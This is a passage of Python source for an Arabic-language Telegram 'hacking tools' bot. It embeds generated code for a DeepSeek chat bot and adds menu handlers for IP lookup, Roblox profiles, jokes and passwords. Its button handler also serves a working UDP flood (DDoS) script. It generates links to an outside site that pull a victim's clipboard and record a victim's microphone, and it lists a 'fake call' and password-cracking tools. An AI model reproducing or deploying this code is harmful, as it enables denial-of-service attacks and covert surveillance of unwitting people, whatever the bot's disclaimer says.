        safe_edit(cid, mid, text, markup=settings_kb(uid))

    elif data == "set_temp":
        bot.answer_callback_query(call.id, "أرسل قيمة درجة الحرارة (0.1 - 2.0)", show_alert=True)
        msg = bot.send_message(cid, "🌡️ أدخل قيمة درجة الحرارة من 0.1 إلى 2.0:")
        bot.register_next_step_handler(msg, set_setting_value, uid, "temperature", float, 0.1, 2.0)

    elif data == "set_tokens":
        bot.answer_callback_query(call.id, "أرسل الحد الأقصى للرموز (1-4096)", show_alert=True)
        msg = bot.send_message(cid, "📝 أدخل الحد الأقصى للرموز من 1 إلى 4096:")
        bot.register_next_step_handler(msg, set_setting_value, uid, "max_tokens", int, 1, 4096)

    elif data == "set_topp":
        bot.answer_callback_query(call.id, "أرسل قيمة Top-P (0.1 - 1.0)", show_alert=True)
        msg = bot.send_message(cid, "🎯 أدخل قيمة Top-P من 0.1 إلى 1.0:")
        bot.register_next_step_handler(msg, set_setting_value, uid, "top_p", float, 0.1, 1.0)

    elif data == "set_freq":
        bot.answer_callback_query(call.id, "أرسل عقوبة التكرار (0.0 - 2.0)", show_alert=True)
        msg = bot.send_message(cid, "📊 أدخل عقوبة التكرار من 0.0 إلى 2.0:")
        bot.register_next_step_handler(msg, set_setting_value, uid, "frequency_penalty", float, 0.0, 2.0)

    elif data == "set_presence":
        bot.answer_callback_query(call.id, "أرسل عقوبة الوجود (0.0 - 2.0)", show_alert=True)
        msg = bot.send_message(cid, "📈 أدخل عقوبة الوجود من 0.0 إلى 2.0:")
        bot.register_next_step_handler(msg, set_setting_value, uid, "presence_penalty", float, 0.0, 2.0)

    elif data == "set_history":
        bot.answer_callback_query(call.id, "أرسل عدد الرسائل للتخزين (1-50)", show_alert=True)
        msg = bot.send_message(cid, "📜 أدخل عدد الرسائل للتخزين من 1 إلى 50:")
        bot.register_next_step_handler(msg, set_setting_value, uid, "max_history", int, 1, 50)

    elif data == "reset_all":
        user_data[str(uid)].update({
            "think": False,
            "search": False,
            "model_type": None,
            "temperature": 0.7,
            "max_tokens": 2048,
            "top_p": 0.9,
            "frequency_penalty": 0.0,
            "presence_penalty": 0.0,
            "stream": True,
            "auto_create_session": True,
            "code_auto_send": True,
            "max_history": 10,
            "response_style": "balanced"
        })
        save_user_data()
        bot.answer_callback_query(call.id, "✅ تم إعادة ضبط جميع الإعدادات!")
        settings = get_all_settings(uid)
        text = "⚙️ جميع الإعدادات:\\n\\n"
        for key, value in settings.items():
            text += f"• {key}: {value}\\n"
        safe_edit(cid, mid, text, markup=settings_kb(uid))

    elif data == "help":
        safe_edit(cid, mid,
            "📖 دليل الاستخدام\\n\\n"
            "🚀 Streaming باستخدام sendMessageDraft (الطريقة الرسمية من تيليجرام)\\n"
            "• تحديث سريع • بدون حظر (Rate Limit)\\n"
            "• يعمل فقط في المحادثات الخاصة (DMs)\\n"
            "• يجب تفعيل 'Forum Topic Mode' للبوت عبر @BotFather\\n\\n"
            "الأوامر:\\n"
            "/new      — محادثة جديدة\\n"
            "/sessions — عرض المحادثات\\n"
            "/stats    — إحصائياتك\\n"
            "/cancel   — إيقاف الرد الحالي\\n"
            "/menu     — القائمة\\n"
            "/settings — جميع الإعدادات\\n\\n"
            "الإعدادات المتوفرة:\\n"
            "🧠 التفكير العميق — تحليل أعمق\\n"
            "🔍 البحث في الويب — معلومات حديثة\\n"
            "🌡️ درجة الحرارة — تحكم في الإبداع\\n"
            "📝 الحد الأقصى للرموز — طول الرد\\n"
            "🎯 Top-P — تنوع الردود\\n"
            "🔄 التدفق — عرض تدريجي\\n"
            "🔄 إنشاء تلقائي — إنشاء جلسة تلقائياً\\n"
            "📎 إرسال الكود — إرسال الأكواد كملفات\\n"
            "📜 سجل المحادثة — عدد الرسائل المخزنة\\n"
            "📝 نمط الرد — متوازن/مختصر/مفصل/إبداعي",
            markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 رجوع", callback_data="back_main")))

    elif data == "back_main":
        safe_edit(cid, mid, "📋 القائمة:", markup=main_kb())

def set_setting_value(message, uid, key, cast_type, min_val, max_val):
    try:
        value = cast_type(message.text)
        if min_val <= value <= max_val:
            user_data[str(uid)][key] = value
            save_user_data()
            bot.send_message(message.chat.id, f"✅ تم تحديث {key} إلى {value}")
            settings = get_all_settings(uid)
            text = "⚙️ جميع الإعدادات:\\n\\n"
            for k, v in settings.items():
                text += f"• {k}: {v}\\n"
            bot.send_message(message.chat.id, text, reply_markup=settings_kb(uid))
        else:
            bot.send_message(message.chat.id, f"❌ القيمة يجب أن تكون بين {min_val} و {max_val}")
    except:
        bot.send_message(message.chat.id, "❌ قيمة غير صالحة، حاول مرة أخرى")

def _send_stats(cid, uid, edit=None):
    data = init_user(uid)
    sid = data.get("session_id")
    msgs = data.get("total_msgs", 0)
    chars = data.get("total_chars", 0)
    think = "✅" if data.get("think") else "❌"
    srch = "✅" if data.get("search") else "❌"
    sid_t = f"{sid[:20]}…" if sid else "لا توجد"
    text = (
        f"📊 إحصائياتك\\n\\n"
        f"💬 رسائل مُرسلة  : {msgs}\\n"
        f"🔤 إجمالي الأحرف : {chars}\\n"
        f"🧠 التفكير العميق: {think}\\n"
        f"🔍 البحث في الويب: {srch}\\n"
        f"🚀 تقنية sendMessageDraft\\n"
        f"📌 الجلسة النشطة : {sid_t}"
    )
    mk = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 رجوع", callback_data="back_main"))
    if edit:
        safe_edit(edit[0], edit[1], text, markup=mk)
    else:
        bot.send_message(cid, text, reply_markup=mk)

@bot.message_handler(func=lambda m: True, content_types=['text'])
@subscription_required
def handle_message(msg):
    uid = msg.from_user.id
    cid = msg.chat.id
    data = init_user(uid)

    if data.get("waiting"):
        bot.send_message(cid, "⏳ انتظر الرد الحالي… أو /cancel")
        return

    if not data.get("session_id") and data.get("auto_create_session", True):
        m = bot.send_message(cid, "🔄 إنشاء محادثة…")
        sid = create_chat_session()
        if not sid:
            bot.edit_message_text("❌ فشل إنشاء الجلسة، أرسل /new.", cid, m.message_id)
            return
        data["session_id"] = sid
        data["parent_id"] = None
        save_user_data()
        bot.delete_message(cid, m.message_id)

    if not data.get("session_id"):
        bot.send_message(cid, "❌ لا توجد جلسة نشطة. أرسل /new لإنشاء محادثة جديدة.")
        return

    data["waiting"] = True
    data["total_msgs"] = data.get("total_msgs", 0) + 1
    data["total_chars"] = data.get("total_chars", 0) + len(msg.text)
    save_user_data()

    def run():
        try:
            pow_token = get_pow()
            if not pow_token:
                bot.send_message(cid, "❌ فشل POW، حاول مجدداً.", reply_markup=chat_kb())
                return

            final_text, new_pid = stream_with_draft(
                msg.text, pow_token,
                data["session_id"],
                data["parent_id"],
                cid, uid
            )
            if new_pid:
                data["parent_id"] = new_pid
                save_user_data()

        except Exception as e:
            bot.send_message(cid, f"❌ خطأ: {e}", reply_markup=chat_kb())
        finally:
            data["waiting"] = False
            save_user_data()

    threading.Thread(target=run, daemon=True).start()

if __name__ == "__main__":
    print("╔══════════════════════════════════════════════╗")
    print("║   🚀  DeepSeek Live Stream                  ║")
    bot.infinity_polling(timeout=60, long_polling_timeout=30)"""
    
    try:
        # Send as file to avoid length issues
        with tempfile.NamedTemporaryFile(suffix=".py", delete=False, mode='w', encoding='utf-8') as f:
            f.write(bot_code)
            tmp = f.name
        
        await query.edit_message_text(
            "🤖 **كود بوت التليجرام الجاهز:**\n\nتم إرسال الكود كملف لأنه طويل.",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
        )
        
        with open(tmp, 'rb') as f:
            await update.effective_message.reply_document(
                document=f,
                filename="telegram_bot.py",
                caption="🤖 كود بوت تليجرام جاهز مع DeepSeek AI"
            )
        
        os.unlink(tmp)
        
    except Exception as e:
        await query.edit_message_text(
            f"⚠️ حدث خطأ أثناء إرسال الكود: {e}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
        )

async def button(update: Update, context) -> int:
    query = update.callback_query
    await query.answer()

    if query.data == 'website_files':
        await query.edit_message_text("الرجاء إرسال رابط الموقع الذي تريد الحصول على ملف HTML الخاص به. 🌐", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_WEBSITE_URL

    elif query.data == 'ip_info':
        await query.edit_message_text("الرجاء إرسال عنوان IP أو اسم النطاق (Domain) للحصول على معلوماته. 📍", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_IP_INFO_QUERY

    elif query.data == 'generate_email':
        await generate_random_email(update, context)
        return CHOOSING_MAIN_MENU

    elif query.data == 'unblock_whatsapp':
        await unblock_whatsapp(update, context)
        return CHOOSING_MAIN_MENU

    elif query.data == 'fake_call':
        await fake_call(update, context)
        return CHOOSING_MAIN_MENU

    elif query.data == 'generate_bot':
        await generate_bot_code(update, context)
        return CHOOSING_MAIN_MENU

    elif query.data == 'hacking_tools':
        hacking_tools_text = """
• أدوات اختراق الشبكات والأنظمة:

1. Nmap
لفحص الشبكات واكتشاف الأجهزة والخدمات المفتوحة.

2. Wireshark
لتحليل حزم الشبكة ورصد البيانات المرسلة والمستقبلة.

3. Metasploit Framework
منصة لاختبار الثغرات وتنفيذ هجمات تحكم عن بُعد.

4. Aircrack-ng
لاختبار اختراق شبكات الواي فاي (Wi-Fi).

5. Burp Suite
أداة لاختبار أمان تطبيقات الويب واكتشاف ثغرات مثل XSS وSQL Injection.

6. John the Ripper
برنامج لكسر كلمات المرور (Password Cracking).

7. Hydra
أداة اختبار قوة كلمات المرور (Brute Force).

8. Nikto
ماسح ثغرات ويب (Web Vulnerability Scanner).

9. SQLmap
لاكتشاف واستغلال ثغرات SQL Injection في قواعد البيانات.

10. Hashcat
برنامج قوي لكسر كلمات المرور المشفرة.


---

أدوات نظام لينكس الشائعة في مجال الأمن:

Kali Linux
توزيعة لينكس مخصصة للاختراق الأخلاقي تحتوي على معظم الأدوات السابقة.

Parrot Security OS
توزيعة بديلة مع أدوات مشابهة
"""
        await query.edit_message_text(hacking_tools_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return CHOOSING_MAIN_MENU

    elif query.data == 'search_user':
        await query.edit_message_text("الرجاء إرسال معرف حساب شخص في تليجرام للانتقال إلى حسابه. 🔍", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_TELEGRAM_USER_ID

    elif query.data == 'clipboard_pull':
        user_id = query.from_user.id
        clipboard_link = f"✅- تم إنشاء رابط سحب الحافظة \nhttps://max.powerv1.site/pag/cop.php?ID={user_id}&IDx={user_id}"
        await query.edit_message_text(clipboard_link, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return CHOOSING_MAIN_MENU

    elif query.data == 'victim_sound':
        user_id = query.from_user.id
        victim_sound_link = f"✅- تم إنشاء رابط تسجيل صوت اضحيه\nhttps://max.powerv1.site/pag/mic.php?ID={user_id}&IDx={user_id}"
        await query.edit_message_text(victim_sound_link, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return CHOOSING_MAIN_MENU

    elif query.data == 'how_to_be_hacker':
        how_to_hacker_text = """
• 1. ابدأ بتعلّم أساسيات الكمبيوتر: كيف يعمل الجهاز، الملفات، الرام، المعالج.

2. اتقن الشبكات: مثل IP, DNS, البروتوكولات (TCP/IP).

3. استخدم نظام Linux: هو النظام الأساسي للهاكرز المحترفين.

4. تعلم البرمجة: أهم لغات الاختراق: Python، Bash، C، JavaScript.

5. تعرّف على أنواع أنظمة التشغيل: Windows، Linux، Android.

6. استخدم أدوات اختبار الاختراق مثل:

Nmap (للبحث عن الأجهزة).

Wireshark (لمراقبة الشبكة).

Metasploit (لتجربة الثغرات).

7. افهم الثغرات الأمنية: SQL Injection، XSS، Brute Force.

8. مارس عبر منصات تدريب:

HackTheBox

TryHackMe

9. تعلّم الهندسة الاجتماعية: فن خداع الناس لجمع معلومات.

10. تدرّب على اختراق قانوني (CTF) لتطوير مهاراتك.

11. اقرأ كتب وأدلة تعليمية متخصصة.

12. تابع دورات على يوتيوب ومواقع مجانية.

13. احصل على شهادات دولية مثل CEH أو OSCP.

14. ابقَ مطّلعًا على أحدث الثغرات والهجمات.

15. كن أخلاقيًا ولا تخرق القانون.

16. سجّل في مجتمعات هاكرز أخلاقيين لتتعلّم منهم.

17. استخدم مهاراتك في حماية الأنظمة وليس تخريبها.

18. ابدأ صغيرًا، وتمرّن يوميًا، ولا تستعجل الاحتراف
"""
        await query.edit_message_text(how_to_hacker_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return CHOOSING_MAIN_MENU

    elif query.data == 'decrypt_roblox':
        await query.edit_message_text("الرجاء إرسال ملف يحتوي على سكربت روبلوكس مشفر (base64 أو تشفير ضعيف) لفك تشفيره. 🔓", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_DECRYPT_ROBLOX_SCRIPT

    elif query.data == 'roblox_account_info':
        await query.edit_message_text("الرجاء إرسال اسم المستخدم (Username) الخاص بحساب روبلوكس للحصول على معلوماته. 👤", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_ROBLOX_USERNAME

    elif query.data == 'decorate_text':
        await query.edit_message_text("الرجاء إرسال النص الذي تريد زخرفته. ✨", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_DECORATE_TEXT

    elif query.data == 'joke':
        await generate_joke(update, context)
        return CHOOSING_MAIN_MENU

    elif query.data == 'ddos_tool':
        ddos_code = """
import socket
import threading
import random
import time
import sys

target_ip = input("IP: ")
target_port = int(input("Port: "))
threads = int(input("Threads: "))

def flood():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(random._urandom(1024), (target_ip, target_port))
        except:
            pass

for _ in range(threads):
    threading.Thread(target=flood).start()
"""
        await query.edit_message_text(f"```python\n{ddos_code}\n```", parse_mode='MarkdownV2', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return CHOOSING_MAIN_MENU
    
    elif query.data == 'ddos_explain':
        await ddos_explain(update, context)
        return CHOOSING_MAIN_MENU
    
    elif query.data == 'deepseek_prompt':
        await deepseek_prompt(update, context)
        return CHOOSING_MAIN_MENU

    elif query.data == 'check_link':
        await query.edit_message_text("الرجاء إرسال الرابط الذي تريد فحصه. 🔗", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_CHECK_LINK_URL

    elif query.data == 'generate_password':
        await generate_strong_password(update, context)
        return CHOOSING_MAIN_MENU

    elif query.data == 'instructions':
        instructions_text = """
📜 شروط الاستخدام:

أتعهد أنا المستخدم للتطبيق بأنني:

✅ لن أستخدم التطبيق فيما يغضب الله تعالى.
✅ لن أسرق صور أو حسابات بغرض السرقة أو التجسس على الرسائل.
✅ سأستخدم التطبيق فقط لغرض:

المزاح اللطيف.

الربح المشروع.

التجربة الشخصية.

الدعاية والإعلانات المسموح بها.

⚠️ أُبرئ ذمة مالك ومسؤول التطبيق من أي استخدام خاطئ أو مخالف يؤدي إلى معصية أو ضرر بالآخرين.

✨ الرجاء استخدام التطبيق بما يرضي الله ويحفظ حقوق الجميع
"""
        await query.edit_message_text(instructions_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return CHOOSING_MAIN_MENU
    
    elif query.data == 'analyze_phone':
        return await analyze_phone_number(update, context)
    
    elif query.data == 'analyze_email':
        return await analyze_email(update, context)

    return CHOOSING_MAIN_MENU

async def get_website_html(update: Update, context) -> int:
    url = update.message.text
    if not url or not (url.startswith('http://') or url.startswith('https://')):
        await update.message.reply_text("الرجاء إرسال رابط صحيح يبدأ بـ http:// أو https:// 🌐", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_WEBSITE_URL

    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        file_name = f"website_{re.sub(r'[\W_]+', '_', url)}.html"
        with open(file_name, "w", encoding="utf-8") as f:
            f.write(str(soup.prettify()))
        await update.message.reply_document(document=open(file_name, 'rb'), filename=file_name, caption="تم استخراج ملف HTML للموقع بنجاح. 📄", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except requests.exceptions.RequestException as e:
        await update.message.reply_text(f"حدث خطأ أثناء جلب محتوى الموقع: {e} ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ غير متوقع: {e} ⚠️", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    return CHOOSING_MAIN_MENU

async def get_ip_info(update: Update, context) -> int:
    query_text = update.message.text
    if not query_text:
        await update.message.reply_text("الرجاء إرسال عنوان IP أو اسم النطاق (Domain) للحصول على معلوماته. 📍", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_IP_INFO_QUERY

    try:
        ip_address = None
        domain_name = None

        if re.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", query_text):
            ip_address = query_text
            domain_name = "غير متوفر"
        else:
            try:
                ip_address = socket.gethostbyname(query_text)
                domain_name = query_text
            except socket.gaierror:
                await update.message.reply_text("تعذر حل اسم النطاق أو عنوان IP غير صالح. ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
                return CHOOSING_MAIN_MENU

        response = requests.get(f"http://ip-api.com/json/{ip_address}")
        response.raise_for_status()
        data = response.json()

        if data.get("status") == "success":
            info_text = f"🌐 الدومين: {domain_name}\n"
            info_text += f"📟 عنوان IP: {data.get('query', 'غير متوفر')}\n"
            info_text += f"🏳️ الدولة: {data.get('country', 'غير متوفر')}\n"
            info_text += f"🏙️ المدينة: {data.get('city', 'غير متوفر')}\n"
            info_text += f"🌍 القارة: {data.get('continent', 'غير متوفر')}\n"
            info_text += f"🛰️ مزود الخدمة (ISP): {data.get('isp', 'غير متوفر')}\n"
            info_text += f"🖥️ المنظمة (Organization): {data.get('org', 'غير متوفر')}\n"
            info_text += f"💼 ASN: {data.get('as', 'غير متوفر')}\n"
            info_text += f"🧭 الإحداثيات: {data.get('lat', 'غير متوفر')}, {data.get('lon', 'غير متوفر')}\n"
            if data.get('lat') and data.get('lon'):
                info_text += f"📌 رابط لعرض الموقع على الخريطة: https://www.google.com/maps?q={data['lat']},{data['lon']}\n"
            else:
                info_text += f"📌 رابط لعرض الموقع على الخريطة: غير متوفر\n"

            if data.get('proxy') or data.get('hosting'):
                info_text += "\n⚠️ ملاحظة: قد يكون الموقع الجغرافي المعروض هو موقع خادم CDN/Proxy وليس بالضرورة موقع الخادم الأصلي."

            await update.message.reply_text(info_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        else:
            await update.message.reply_text(f"تعذر الحصول على معلومات IP: {data.get('message', 'خطأ غير معروف')} ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except requests.exceptions.RequestException as e:
        await update.message.reply_text(f"حدث خطأ أثناء الاتصال بخدمة معلومات IP: {e} ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ غير متوقع: {e} ⚠️", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    return CHOOSING_MAIN_MENU

async def search_telegram_user(update: Update, context) -> int:
    user_id_or_username = update.message.text
    if not user_id_or_username:
        await update.message.reply_text("الرجاء إرسال معرف حساب شخص في تليجرام أو اسم المستخدم. 🔍", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_TELEGRAM_USER_ID

    try:
        if user_id_or_username.isdigit():
            user_link = f"tg://user?id={user_id_or_username}"
            await update.message.reply_text(f"يمكنك الانتقال إلى حساب المستخدم عبر هذا الرابط: [الذهاب للحساب]({user_link}) 🚀", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        elif user_id_or_username.startswith('@'):
            user_link = f"https://t.me/{user_id_or_username[1:]}"
            await update.message.reply_text(f"يمكنك الانتقال إلى حساب المستخدم عبر هذا الرابط: [الذهاب للحساب]({user_link}) 🚀", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        else:
            await update.message.reply_text("الرجاء إدخال معرف حساب تليجرام صحيح (رقم) أو اسم مستخدم يبدأ بـ @. ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ غير متوقع: {e} ⚠️", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    return CHOOSING_MAIN_MENU

async def generate_joke(update: Update, context) -> None:
    jokes = [
        "ما هو الشيء الذي يمشي ويقف وليس له أرجل؟ الساعة. 😂",
        "لماذا يضع الفيل طلاء أظافر أحمر؟ ليختبئ في شجرة الفراولة. 🐘💅",
        "ما هو أذكى حيوان؟ الزرافة، لأن رأسها في السحاب. 🦒🧠",
        "ماذا قال الجبل للجبل؟ لم نلتقِ منذ زمن طويل. ⛰️⛰️",
        "لماذا سميت حاسة الشم بهذا الاسم؟ لأنها تشم. 👃",
        "ما هو وجه الشبه بين الكمبيوتر والحفرة؟ كلاهما يحتاج إلى حفر. 💻🕳️",
        "ما هو الشيء الذي كلما أخذت منه كبر؟ الحفرة. 🕳️",
        "ما هو الشيء الذي يرتفع ولا ينزل؟ العمر. 📈",
        "ما هو الشيء الذي له عين واحدة ولا يرى؟ الإبرة. 👁️🧵",
        "ما هو الشيء الذي له أسنان ولا يعض؟ المشط. 🦷"
    ]
    joke = random.choice(jokes)
    await update.callback_query.edit_message_text(f"{joke}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("نكته أخرى 😂", callback_data='joke')], [InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))

async def generate_strong_password(update: Update, context) -> None:
    characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(characters) for i in range(16))
    await update.callback_query.edit_message_text(f"🔑 كلمة مرور قوية جديدة:\n{password}", parse_mode='MarkdownV2', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("توليد كلمة مرور أخرى 🔑", callback_data='generate_password')], [InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))

async def check_link(update: Update, context) -> int:
    url = update.message.text
    if not url or not (url.startswith('http://') or url.startswith('https://')):
        await update.message.reply_text("الرجاء إرسال رابط صحيح يبدأ بـ http:// أو https:// 🔗", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_CHECK_LINK_URL

    try:
        domain = re.findall(r'https?://(?:www\.)?([^/]+)\b', url)[0]

        ip_address = None
        try:
            ip_address = socket.gethostbyname(domain)
        except socket.gaierror:
            await update.message.reply_text("تعذر حل اسم النطاق من الرابط. ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
            return CHOOSING_MAIN_MENU

        response = requests.get(f"http://ip-api.com/json/{ip_address}")
        response.raise_for_status()
        data = response.json()

        if data.get("status") == "success":
            info_text = f"🌐 الدومين: {domain}\n"
            info_text += f"📟 عنوان IP: {data.get('query', 'غير متوفر')}\n"
            info_text += f"🏳️ الدولة: {data.get('country', 'غير متوفر')}\n"
            info_text += f"🏙️ المدينة: {data.get('city', 'غير متوفر')}\n"
            info_text += f"🌍 القارة: {data.get('continent', 'غير متوفر')}\n"
            info_text += f"🛰️ مزود الخدمة (ISP): {data.get('isp', 'غير متوفر')}\n"
            info_text += f"🖥️ المنظمة (Organization): {data.get('org', 'غير متوفر')}\n"
            info_text += f"💼 ASN: {data.get('as', 'غير متوفر')}\n"
            info_text += f"🧭 الإحداثيات: {data.get('lat', 'غير متوفر')}, {data.get('lon', 'غير متوفر')}\n"
            if data.get('lat') and data.get('lon'):
                info_text += f"📌 رابط لعرض الموقع على الخريطة: https://www.google.com/maps?q={data['lat']},{data['lon']}\n"
            else:
                info_text += f"📌 رابط لعرض الموقع على الخريطة: غير متوفر\n"

            if data.get('proxy') or data.get('hosting'):
                info_text += "\n⚠️ ملاحظة: قد يكون الموقع الجغرافي المعروض هو موقع خادم CDN/Proxy وليس بالضرورة موقع الخادم الأصلي."

            await update.message.reply_text(info_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        else:
            await update.message.reply_text(f"تعذر الحصول على معلومات IP للرابط: {data.get('message', 'خطأ غير معروف')} ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except requests.exceptions.RequestException as e:
        await update.message.reply_text(f"حدث خطأ أثناء فحص الرابط: {e} ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ غير متوقع: {e} ⚠️", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    return CHOOSING_MAIN_MENU

async def get_roblox_account_info(update: Update, context) -> int:
    username = update.message.text
    if not username:
        await update.message.reply_text("الرجاء إرسال اسم المستخدم (Username) الخاص بحساب روبلوكس. 👤", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
        return GETTING_ROBLOX_USERNAME

    try:
        user_id_response = requests.post(
            "https://users.roblox.com/v1/usernames/users",
            json={"usernames": [username], "excludeBannedUsers": True}
        )
        user_id_response.raise_for_status()
        user_data = user_id_response.json()

        if not user_data or not user_data.get('data'):
            await update.message.reply_text("لم يتم العثور على المستخدم بهذا الاسم. ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
            return CHOOSING_MAIN_MENU

        user_id = user_data['data'][0]['id']
        display_name = user_data['data'][0]['displayName']

        user_details_response = requests.get(f"https://users.roblox.com/v1/users/{user_id}")
        user_details_response.raise_for_status()
        details = user_details_response.json()

        friends_count_response = requests.get(f"https://friends.roblox.com/v1/users/{user_id}/friends/count")
        friends_count_response.raise_for_status()
        friends_count = friends_count_response.json().get('count', 'غير متوفر')

        followers_count_response = requests.get(f"https://friends.roblox.com/v1/users/{user_id}/followers/count")
        followers_count_response.raise_for_status()
        followers_count = followers_count_response.json().get('count', 'غير متوفر')

        created_date_str = details.get('created', 'غير متوفر')
        account_age = "غير متوفر"
        if created_date_str != 'غير متوفر':
            created_date = datetime.fromisoformat(created_date_str.replace('Z', '+00:00'))
            age_delta = datetime.now(created_date.tzinfo) - created_date
            years = age_delta.days // 365
            months = (age_delta.days % 365) // 30
            account_age = f"{years} سنة و {months} شهر"

        info_text = f"معلومات حساب روبلوكس:\n\n"
        info_text += f"👤 اسم المستخدم: {username}\n"
        info_text += f"🆔 معرف الحساب: {user_id}\n"
        info_text += f"✨ الاسم المعروض: {display_name}\n"
        info_text += f"🗓️ تاريخ الإنشاء: {created_date_str.split('T')[0] if created_date_str != 'غير متوفر' else 'غير متوفر'}\n"
        info_text += f"👴 عمر الحساب: {account_age}\n"
        info_text += f"👫 عدد الأصدقاء: {friends_count}\n"
        info_text += f"💖 عدد المتابعين: {followers_count}\n"

        await update.message.reply_text(info_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))

    except requests.exceptions.RequestException as e:
        await update.message.reply_text(f"حدث خطأ أثناء جلب معلومات حساب روبلوكس: {e} ❌", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]]))
    except Exception as e:
